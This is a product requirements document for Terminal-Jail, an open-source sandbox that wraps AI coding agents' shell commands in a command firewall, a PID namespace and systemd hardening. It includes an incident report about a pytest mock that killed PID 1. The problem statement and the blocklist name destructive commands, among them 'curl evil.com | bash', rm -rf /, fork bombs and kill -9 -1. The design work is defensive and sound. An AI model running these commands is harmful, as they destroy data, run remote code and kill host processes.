PRD: Terminal-Jail

Three-Layer Process Sandbox for AI Agent Infrastructure
v1.1 · Open Source (MIT) · github.com/totalwindupflightsystems/terminal-jail

Feedback sought. This PRD describes what we've built and where we're going. Is this the right problem? Right architecture? What are we missing? Reply to @wojons on X or open an issue on GitHub.

1. The Problem

AI coding agents run arbitrary shell commands. Every command is a potential system kill switch.

Real incident — July 19, 2026: A pytest run on a Hermes agent foreman contained a mocked MagicMock() object whose __index__() method resolved to integer 1. The test called os.killpg(1, SIGKILL). PID 1 on Linux is init/systemd — the process group leader for the entire user session.

BEFORE: MagicMock().__index__() = 1 → killpg(1, SIGKILL) → PID 1 = init ✗ Hermes Gateway (SIGKILL) ✗ Cron scheduler (SIGKILL) ✗ Signal daemon (SIGKILL) ✗ Docker containers (SIGKILL) ✗ User shells (SIGKILL) ✗ LSP servers (SIGKILL) ✗ DuckBrain / Chimera (SIGKILL) Result: 56 gateway deaths/day, 8-minute boot cycles, 30+ hours undiagnosed

Every diagnostic pointed at memory pressure. OOM killer — zero kills. systemd-oomd — zero kills. The real cause was a test framework killing everything on the system, and every restart triggering the same cycle.

The bigger problem: This wasn't a malicious attack. It was a benign pytest run. AI agents run tests, build scripts, package installers, and subprocess chains thousands of times per day. Any one of them can:

  • Call killpg(1, SIGKILL) — kills every process owned by the user
  • Pipe curl evil.com | bash — arbitrary code execution from the internet
  • Execute rm -rf / — total filesystem destruction
  • Spawn fork bombs — PID exhaustion
  • Run sudo if passwordless — privilege escalation

Existing solutions don't catch this. Docker containers, VM sandboxes, and filesystem-only isolation (bubblewrap, Nix, gVisor) focus on where code runs — they don't inspect what commands do. The agent still has a shell. The shell still has a PID namespace. kill -9 -1 inside a Docker container kills the container. It doesn't matter — but if you run agents on bare metal (many do for performance), there's no container to sacrifice.

2. The Solution: Three-Layer Defense

Terminal-Jail wraps every terminal command an AI agent runs through three independent security layers. No single layer is trusted to hold the line alone.

LAYER 1: INTERRUPTOR — Command Firewall "rm -rf /" → BLOCKED before execution "pytest" → MODIFIED (auto-wrapped in sandbox) "echo hi" → ALLOWED (passthrough) │ ▼ LAYER 2: PID NAMESPACE JAIL unshare --user --pid --fork --kill-child=SIGKILL PID 1 inside jail = /bin/bash, not init kill -9 -1 kills only the sandbox Seccomp BPF denies 18 dangerous syscalls │ ▼ LAYER 3: SYSTEMD HARDENING PrivateUsers, ProtectProc=invisible RestrictNamespaces=~pid, NoNewPrivileges Read-only filesystem, capability bounding set │ ▼ Linux Kernel

Layer 1: Interruptor — "Stop it before it runs"

A bash-level command firewall. Every command passes through a rule engine that returns ALLOW, BLOCK, or MODIFY.

  • 10 critical blocklist rules: rm -rf /, curl | bash, sudo, fork bombs, mkfs, dd of=/dev/, chmod 777 /, redirect to /etc/, fdisk, kill -9 -1
  • 8 auto-sandbox rules: pytest, npm test, go test, make, pip install, cargo, gcc, script execution — automatically wrapped in PID namespace
  • 9 always-allow rules: echo, ls, cd, grep, git status, cat, find (no -exec), python --version, which
  • User-defined rules: YAML files in ~/.config/terminal-jail/rules.d/. 9 match types (pattern, command, pipeline, subcommand, path, composite, syscall, network, heredoc).

Layer 2: PID Namespace Jail — "Contain the blast radius"

If a command passes the firewall (or is auto-sandboxed), it executes inside a Linux PID namespace. Inside the namespace, PID 1 is a fresh /bin/bash — not the real init. Any process-kill operation is trapped inside the sandbox.

  • Seccomp BPF filter: Denies mount, kexec_load, init_module, swapon, settimeofday, and 13 more dangerous syscalls. Pure Python, zero dependencies.
  • User namespace: Optional UID isolation — runs as nobody (uid=65534).
  • Zero dependencies: Python stdlib only. No bubblewrap, Docker, Nix, or Rust required.

Layer 3: systemd Hardening — "Prevent kernel escape"

14 systemd hardening directives applied to the agent gateway service unit:

  • ProtectProc=invisible — other processes hidden from /proc
  • PrivateUsers=true — UID namespace isolation
  • RestrictNamespaces=~pid — PID namespace escape blocked
  • NoNewPrivileges=true — capability escalation impossible
  • ProtectSystem=strict — read-only root filesystem
  • CapabilityBoundingSet — drops CAP_SYS_ADMIN and 9 others

3. Deployment Model

One line in systemd. The entire system deploys by replacing the agent's $SHELL:

# /etc/systemd/system/hermes-gateway.service.d/95-jail.conf
[Service]
Environment="SHELL=/usr/local/bin/terminal-jail-sh"

Every command the agent runs — whether ls, pytest, or curl — goes through the interruptor and PID namespace automatically. No code changes to the agent. No container wrapper. No Docker overhead.

Also ships as standalone CLI:

terminal-jail pytest                    # PID namespace only
terminal-jail --user --seccomp npm test  # Full isolation
terminal-jail --interruptor curl https://example.com  # Firewall enabled

4. What Makes This Different

Existing ApproachLimitationTerminal-Jail
Docker / VM sandboxes Heavy. Doesn't inspect commands. kill -9 -1 kills container but not host — but agents on bare metal have no container. Lightweight. Kernel namespaces without containers. Works on bare metal.
Filesystem-only isolation (bubblewrap, Nix, gVisor) Protects files. Doesn't protect processes. killpg(1) still works. PID namespace isolation specifically targets process-kill attacks.
just-bash (TypeScript bash reimplementation) Overlay filesystem. Doesn't address process namespace attacks. Rewrites bash — massive surface. Wraps real bash — smaller surface, same kernel isolation.
ai-jail (Rust + bubblewrap) Filesystem + network isolation. No command-level inspection. Command firewall with user-extensible YAML rules. Three defense layers.
Kavach (interceptor with redirects) Spoofs/redirects commands. Complex, attack surface from redirect logic. Block/allow/modify model. Simpler. No redirect attack surface.
Key insight: Most agent sandboxes focus on filesystem and network. Terminal-jail focuses on process namespace attacks — specifically, agents killing their own infrastructure. This is a different threat model. Filesystem isolation prevents data exfiltration. Process namespace isolation prevents infrastructure self-destruction. Both are necessary.

10. Questions for Reviewers

  1. Threat model: Does three-layer defense (firewall → namespace → systemd) cover the attacks you care about? What's missing?
  2. Deployment model: Is "replace $SHELL" the right integration point? Would a ptrace-based interceptor be better?
  3. Rule engine: Should the interruptor use a proper shell parser (e.g., shlex AST) instead of regex patterns? Where does regex break?
  4. Cross-platform: This is Linux-only (PID namespaces). Is macOS support (sandbox-exec / Seatbelt) worth the complexity?
  5. Network isolation: Should --unshare-net be on by default? Does that break too many agent workflows?
  6. Filesystem overlay: Should we add an overlay filesystem (like just-bash) so writes are virtual? Or is systemd's read-only root sufficient?
